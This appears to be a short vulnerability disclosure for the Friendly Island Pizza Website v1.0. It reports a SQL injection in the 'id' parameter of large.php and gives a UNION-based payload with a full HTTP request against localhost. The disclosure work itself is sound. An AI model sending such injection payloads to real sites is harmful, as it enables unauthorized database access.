# Friendly Island Pizza Website and Ordering System v1.0 has SQL injection

BUG_Author: a-xsg

Website source address：https://www.sourcecodester.com/php/14730/friendly-island-pizza-website-php-mysql.html

Vulnerability File: /FriendlyIsPizzaWebsite/large.php

GET parameter 'id' exists SQL injection vulnerability

Payload:id=1 union all select null,null,null,concat(0x31323334,0x21222324,0x41424344),null,null,null,null,null--

```
GET /FriendlyIsPizzaWebsite/large.php?id=1%20union%20all%20select%20null,null,null,concat(0x31323334,0x21222324,0x41424344),null,null,null,null,null-- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close
```

The concat statement executes successfully

![https://github.com/tangtangtang123456/bug_report/blob/main/pictures/1.png]
